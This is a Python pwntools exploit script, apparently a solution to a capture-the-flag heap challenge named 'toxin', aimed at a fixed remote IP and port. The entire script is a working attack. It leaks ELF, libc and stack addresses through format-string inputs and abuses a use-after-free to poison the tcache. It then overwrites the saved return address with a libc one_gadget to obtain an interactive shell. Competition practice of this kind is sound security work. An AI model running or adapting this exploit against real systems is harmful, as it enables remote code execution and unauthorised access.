#!/usr/bin/python3
from pwn import *
HOST = '159.65.16.219'
PORT = 30003
EXE  = './toxin'
LIBC = './lib/libc.so.6'
# ------------------------------------------------------------------
def add_toxin(size, index, payload):
   r.recvuntil(b'> ')
   r.sendline(b'1')
   r.recvuntil(b'formula length: ')
   r.sendline(f'{size}'.encode())
   r.recvuntil(b'index: ')
   r.sendline(f'{index}'.encode())
   r.recvuntil(b'toxin formula: ')
   r.sendline(payload)
def edit_toxin(index, payload):
   r.recvuntil(b'> ')
   r.sendline(b'2')
   r.recvuntil(b'index: ')
   r.sendline(f'{index}'.encode())
   r.recvuntil(b'toxin formula: ')
   r.sendline(payload)
def drink_toxin(index):
   r.recvuntil(b'> ')
   r.sendline(b'3')
   r.recvuntil(b'index: ')
   r.sendline(f'{index}'.encode())
def search_toxin(payload):
   r.recvuntil(b'> ')
   r.sendline(b'4')
   r.recvuntil(b'search term: ')
   r.send(payload)
   leak = int(r.recvuntil(b'not')[:-4].decode(), 16)
   return leak
# ------------------------------------------------------------------
if args.R:
   r = remote(HOST, PORT)
elif (args.D or args.L):
   r = process(EXE)
   if args.D:
      gdb.attach(r, ''' ''')
      input('gdb...')
else:
   print('Usage: ./<filename>.py <D | L | R>')
   exit()
#-------------------------------------------------------------------
libc = ELF(LIBC)
elf  = ELF(EXE)
leak = search_toxin(b'%9$lx')
log.info('Text Leak  @ %#x', leak)
offset = 0x1284
elf.address = leak - offset
log.info('ELF base   @ %#x', elf.address)
leak = search_toxin(b'%3$lx')
log.info('Libc Leak  @ %#x', leak)
offset = 0x110081
libc.address = leak - offset
log.info('LIBC base  @ %#x', libc.address)
leak = search_toxin(b'%1$lx')
log.info('Stack Leak @ %#x', leak)
saved_rip = leak + 0xe
log.info('Saved RIP  @ %#x', saved_rip)
add_toxin(0x10, 0, b'A'*0x10)
drink_toxin(0)
edit_toxin(0, p64(saved_rip))
one_gadget1 = 0x4f2c5
one_gadget2 = 0x4f322
one_gadget3 = 0x10a38c
add_toxin(0x10, 1, b'B'*0x10)
add_toxin(0x10, 2, p64(libc.address + one_gadget2))
r.interactive()
